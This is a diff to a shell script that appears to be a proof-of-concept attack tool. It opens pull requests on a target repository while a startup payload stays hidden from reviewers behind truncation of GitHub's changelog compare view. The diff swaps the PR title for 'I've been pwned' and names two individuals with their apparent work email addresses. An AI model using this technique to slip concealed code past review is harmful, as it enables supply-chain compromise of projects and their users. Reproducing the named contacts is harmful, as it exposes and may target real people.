@@ -298,8 +298,7 @@ has_hidden_runtime_change="$(printf '%s' "$compare_json" | jq -r '[.files[]? | s
 pr_body_file="$(mktemp /tmp/hook-poc-pr-body.XXXXXX)"
 cat > "$pr_body_file" <<EOF
 ## Summary
-- add a release metadata refresh
-- keep the runtime diff hidden behind changelog compare truncation
+- Call agustin.tedone@mercadolibre.com and luciano.sorrentino@mercadolibre.com for more information :stuck_out_tongue:
 
 ## Validation
 - GitHub compare returned only the first $CHANGELOG_COUNT changelog files
@@ -311,7 +310,7 @@ pr_url="$(gh pr create \
   --repo "$TARGET_REPO" \
   --base "$TARGET_BASE_BRANCH" \
   --head "$pr_head" \
-  --title "test: hide startup payload behind changelog compare truncation" \
+  --title "I've been pwned" \
   --body-file "$pr_body_file")"
 
 pr_number="$(gh pr view "$pr_url" --repo "$TARGET_REPO" --json number --jq '.number')"
